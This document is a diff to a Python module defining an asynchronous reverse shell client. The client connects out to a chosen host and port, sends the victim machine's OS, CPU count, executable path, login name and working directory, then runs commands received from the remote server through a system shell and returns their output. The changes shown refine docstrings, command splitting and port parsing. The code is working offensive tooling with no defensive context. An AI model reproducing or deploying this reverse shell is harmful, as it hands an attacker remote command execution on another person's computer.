@@ -37,13 +37,15 @@ from os import (
 from asyncio import create_subprocess_shell, run, gather
 from asyncio.subprocess import PIPE
 from time import perf_counter
+import logging
 
 __all__ = ["ReverseShellClient"]
 
 
 class ReverseShellClient(asyncore.dispatcher):
+
     """
-    This class send informations and output of the command to the server.
+    This class implement an Asynchrone Reverse Shell Client.
     """
 
     def __init__(self, host, port):
@@ -53,9 +55,11 @@ class ReverseShellClient(asyncore.dispatcher):
         self.get_first_buffer()
 
     def get_first_buffer(self):
+
         """
-        This method add some informations in the first time.
+        This method add some informations to init the connection.
         """
+        
         path_exec = "\n\t".join(get_exec_path())
         self.buffer = (
             f"OS utilisé : {os.name}\nNombre de CPU : {cpu_count()}\n"
@@ -63,9 +67,11 @@ class ReverseShellClient(asyncore.dispatcher):
         )
 
     def get_buffer_end(self):
+
         """
         This method add the last line of the output to the client.
         """
+        
         if os.name == "nt":
             self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}-{getcwd()}>"
         else:
@@ -75,9 +81,11 @@ class ReverseShellClient(asyncore.dispatcher):
         self.close()
 
     def handle_read(self):
+
         """
-        This method receive the command and call the execution of the command.
+        Get the command and execute it or close connection.
         """
+        
         commandes = self.recv(65535).decode()
         results = run(launch_exec(commandes))
         self.buffer = "\n".join(results)
@@ -89,22 +97,26 @@ class ReverseShellClient(asyncore.dispatcher):
         return len(self.buffer) > 0
 
     def handle_write(self):
+    
         """
         This method send the command to the client.
         """
+    
         self.get_buffer_end()
         sent = self.send(self.buffer.encode())
         self.buffer = self.buffer[sent:]
 
 
 async def special_command(commande):
+
     """
-    This method execute one command with "special" execution.
+    This method execute commands with "special" execution.
     The command "cd" and "exit" are implemented here.
     """
+    
     if commande.startswith("cd") or commande.startswith("chdir"):
         try:
-            chdir(" ".join(commande.split()[1:]))
+            chdir(commande.split(maxsplit=1)[1])
         except FileNotFoundError:
             return "Error with command : <cd>"
     elif commande.lower().startswith("exit"):
@@ -112,9 +124,11 @@ async def special_command(commande):
 
 
 async def exec_(commande):
+
     """
-    This method execute one command and return the output.
+    This method execute commands and return output.
     """
+    
     result = await special_command(commande)
     if result:
         return result
@@ -132,11 +146,13 @@ async def exec_(commande):
 
 
 async def launch_exec(commandes):
+    
     """
-    This method parse the command and call the execution method.
-    She return a list of output.
+    This method parse commands and launch asynchrone execution.
+    Return a list of commands output.
     """
-    return await gather(*(exec_(commande) for commande in commandes.split(" & ")))
+    
+    return await gather(*(exec_(commande) for commande in commandes.split("&")))
 
 
 def main():
@@ -151,12 +167,12 @@ def main():
             host = arg.split("=")[1]
             argv_number += 1
         elif arg.startswith("--port=") or arg.startswith("-p="):
-            try:
-                port = int(arg.split("=")[1])
-            except ValueError:
-                print("ERROR : port must be an integer.")
-            else:
+            port = arg.split("=", 1)[1]
+            if port.isdigit():
+                port = int(port)
                 argv_number += 1
+            else:
+                logging.error("port must be an integer.")
 
     if len(argv) - argv_number > 1:
         print(
